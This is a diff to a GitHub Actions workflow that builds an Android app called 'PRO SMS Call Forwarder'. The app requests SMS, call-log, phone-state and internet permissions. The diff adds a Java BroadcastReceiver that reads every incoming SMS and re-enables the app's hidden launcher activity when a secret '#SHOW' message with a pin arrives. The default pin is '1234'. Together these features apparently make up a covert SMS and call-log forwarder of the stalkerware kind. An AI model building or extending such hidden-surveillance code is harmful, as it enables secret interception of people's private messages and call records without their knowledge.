@@ -40,29 +40,108 @@ jobs:
           pip install --upgrade pip
           pip install buildozer==1.5.0 cython==0.29.37
 
-      - name: Create buildozer.spec
+      - name: Create App Source Directory Structure
         run: |
-          printf '%s\n' \
-            '[app]' \
-            'title = PRO SMS Call Forwarder' \
-            'package.name = prosmsforwarder' \
-            'package.domain = org.hamza' \
-            'source.dir = .' \
-            'source.include_exts = py,png,jpg,kv,atlas,json' \
-            'version = 2.0' \
-            'requirements = python3,kivy==2.3.0,openssl,requests' \
-            'orientation = portrait' \
-            'fullscreen = 0' \
-            'android.permissions = READ_SMS,RECEIVE_SMS,READ_CALL_LOG,READ_PHONE_STATE,INTERNET,WAKE_LOCK' \
-            'android.api = 33' \
-            'android.minapi = 21' \
-            'android.ndk = 25' \
-            'android.archs = arm64-v8a' \
-            '' \
-            '[buildozer]' \
-            'log_level = 2' \
-            'warn_on_root = 1' \
-            > buildozer.spec
+          mkdir -p android_src/src/org/hamza
+
+      - name: Create Secure Custom Android BroadcastReceiver
+        run: |
+          cat << 'EOF' > android_src/src/org/hamza/SmsReceiver.java
+          package org.hamza;
+
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.os.Bundle;
+          import android.telephony.SmsMessage;
+          import android.content.pm.PackageManager;
+          import android.content.ComponentName;
+          import java.io.File;
+          import java.io.FileInputStream;
+          import org.json.JSONObject;
+
+          public class SmsReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
+                      Bundle bundle = intent.getExtras();
+                      if (bundle != null) {
+                          Object[] pdus = (Object[]) bundle.get("pdus");
+                          if (pdus != null) {
+                              for (Object pdu : pdus) {
+                                  SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
+                                  String msgBody = sms.getMessageBody();
+                                  if (msgBody == null) continue;
+                                  
+                                  msgBody = msgBody.trim();
+                                  
+                                  if (msgBody.startsWith("#SHOW")) {
+                                      String targetPin = "1234"; // الرمز الافتراضي الاحتياطي
+                                      try {
+                                          // قراءة الـ PIN الحقيقي الذي وضعه المستخدم في الإعدادات بشكل ديناميكي
+                                          File cfgFile = new File(System.getProperty("user.home") + "/.smsfwd.json");
+                                          if (cfgFile.exists()) {
+                                              FileInputStream fis = new FileInputStream(cfgFile);
+                                              byte[] data = new byte[(int) cfgFile.length()];
+                                              fis.read(data);
+                                              fis.close();
+                                              JSONObject json = new JSONObject(new String(data, "UTF-8"));
+                                              if (json.has("pin_code")) {
+                                                  targetPin = json.getString("pin_code");
+                                              }
+                                          }
+                                      } catch (Exception e) {
+                                          // تجاهل أخطاء القراءة واستخدام الافتراضي
+                                      }
+                                      
+                                      // التحقق الأمني: يجب أن تكون الرسالة مثلاً "#SHOW 1234"
+                                      if (msgBody.equals("#SHOW " + targetPin)) {
+                                          PackageManager pm = context.getPackageManager();
+                                          ComponentName compName = new ComponentName(context.getPackageName(), "org.kivy.android.PythonActivity");
+                                          pm.setComponentEnabledSetting(
+                                              compName,
+                                              PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                                              PackageManager.DONT_KILL_APP
+                                          );
+                                      }
+                                  }
+                              }
+                          }
+                      }
+                  }
+              }
+          }
+          EOF
+
+      - name: Create buildozer.spec Safely
+        run: |
+          python3 -c "
+          spec = '''[app]
+          title = PRO SMS Call Forwarder
+          package.name = prosmsforwarder
+          package.domain = org.hamza
+          source.dir = .
+          source.include_exts = py,png,jpg,kv,atlas,json,java
+          version = 2.2
+          requirements = python3,kivy==2.3.0,openssl,requests
+          orientation = portrait
+          fullscreen = 0
+          android.permissions = READ_SMS,RECEIVE_SMS,READ_CALL_LOG,READ_PHONE_STATE,INTERNET,WAKE_LOCK
+          android.api = 33
+          android.minapi = 21
+          android.ndk = 25
+          android.archs = arm64-v8a
+          
+          android.add_src = android_src/src
+          android.manifest.manifest_receivers = org.hamza.SmsReceiver
+
+          [buildozer]
+          log_level = 2
+          warn_on_root = 1
+          '''
+          with open('buildozer.spec', 'w') as f:
+              f.write(spec.strip())
+          "
 
       - name: Build APK
         run: yes | buildozer -v android debug
